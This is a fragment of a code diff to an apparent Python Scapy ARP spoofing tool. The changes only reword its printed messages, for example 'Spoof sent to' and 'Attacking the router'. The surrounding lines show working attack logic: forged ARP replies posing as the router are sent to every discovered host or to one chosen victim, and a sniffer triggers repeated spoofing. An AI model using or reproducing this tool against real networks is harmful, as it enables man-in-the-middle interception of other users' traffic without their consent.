@@ -82,17 +82,17 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
       packet = ethernet / arp
       sendp(packet, iface=iface)
-      print("[*]Sent to ( {0} )".format(x['ip']))
+      print("[*]Spoof sent to ( {0} )".format(x['ip']))
 
 
 def arp_sniffing2(pkt):
   if pkt[ARP].op == 1:  # is-at (response)
-        print('\n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\n\n[i] Response of : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof2()
 
 
 #----------------------------------- MAIN PROGRAM ------------------------------------
-print('[*] Starting... [*]')
+print('[*] Starting ARP Spoofing Program... [*]')
 
 #---------------------------------- ARGUMENTS -------------------------------------
 parser = argparse.ArgumentParser()
@@ -114,7 +114,7 @@ me_ip = get_if_addr(iface)
 me_mac = get_if_hwaddr(iface)
 
 # Print our infos (hacker)
-print('\n[i] My IP address : ( {0} ) and my MAC address : ( {1} )'.format(me_ip, me_mac))
+print('\n[i] Your IP address : ( {0} ) and your MAC address : ( {1} )'.format(me_ip, me_mac))
 
 # Router global definition 
 routeur_ip=conf.route.route("0.0.0.0")[2]
@@ -135,7 +135,7 @@ try:
     victim_ip= input()
     
     print("\n[*] Attacking the network %s on iface %s [*]"%(victim_ip, iface))
-    print('[i] Attacking the routeur ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
+    print('[i] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
     all()
 
   # Single victim attack 
